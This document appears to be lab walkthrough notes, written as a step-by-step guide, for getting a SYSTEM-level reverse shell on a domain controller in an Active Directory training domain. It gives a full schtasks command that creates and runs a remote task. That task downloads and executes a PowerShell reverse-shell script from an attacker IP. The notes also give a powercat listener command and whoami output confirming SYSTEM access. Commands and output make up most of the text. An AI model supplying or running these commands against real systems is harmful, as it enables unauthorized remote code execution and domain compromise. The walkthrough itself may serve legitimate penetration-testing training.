# Scheduling and Executing a Task with PowerShell

This guide demonstrates how to schedule a task using PowerShell and execute a reverse shell on a remote machine using `Invoke-PowerShellTcp` and `schtasks`. It also covers how to check if any scheduled tasks are running.

## Step-by-Step Process

### 1. **Adding a Function to the `Invoke-PowerShellTcp` Script**

To initiate a reverse PowerShell shell, run the following command:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 4444
```

Make sure to add the desired function to the end of the script to ensure the reverse shell executes correctly.

### 2. **Creating a Scheduled Task**

You can create a scheduled task on the remote machine (in this case, `dcorp-dc.dollarcorp.moneycorp.local`) using the `schtasks` command:

```powershell
PS C:\Windows\system32> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.157/Invoke-PowerShellTcp-buildin-func.ps1'')'"
```

Explanation of parameters:
- `/S`: Specifies the remote machine (`dcorp-dc.dollarcorp.moneycorp.local`).
- `/SC Weekly`: Schedules the task to run weekly.
- `/RU "NT Authority\SYSTEM"`: Runs the task as the `SYSTEM` account for higher privileges.
- `/TN "STCheck"`: Names the task "STCheck".
- `/TR`: Specifies the task action (in this case, executing PowerShell to download and run the script).

![image](https://github.com/user-attachments/assets/6c9e8fa3-2958-4482-8ee1-064ae52bff20)

The output should be:

```
SUCCESS: The scheduled task "STCheck" has successfully been created.
```

### 3. **Running the Scheduled Task**

To manually run the scheduled task, use the following command:

```powershell
PS C:\Windows\system32> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

The output should confirm that the task has been attempted:

```
SUCCESS: Attempted to run the scheduled task "STCheck".
```
![image](https://github.com/user-attachments/assets/6cd37c97-2719-43d6-8c89-073245f2f8f6)

### 4. **Listening for Incoming Connections**

While the scheduled task is running on the remote machine, you can listen for the reverse shell using Powercat:

```powershell
PS C:\AD\Tools> powercat -v -l -p 4444 -t 1000
```

This command listens on port 4444 for incoming connections, waiting for the reverse shell.

### 5. **Verifying the Current User**

Once you have the reverse shell, verify that you're running with the `SYSTEM` account by checking the hostname and user:

```powershell
PS C:\Windows\system32> hostname
dcorp-dc

PS C:\Windows\system32> whoami
nt authority\system
```

### 6. **Checking for Running Scheduled Tasks**

To check if there are any active scheduled tasks running, use the following command:

```powershell
schtasks /query /S dcorp-dc.dollarcorp.moneycorp.local
```

This will list all scheduled tasks on the remote machine and their current statuses.

---

## Conclusion

By following these steps, you can schedule a task to execute a PowerShell reverse shell on a remote machine, listen for incoming connections, and verify your elevated privileges. Additionally, checking for running scheduled tasks can help you monitor the status of any ongoing tasks on the remote system.

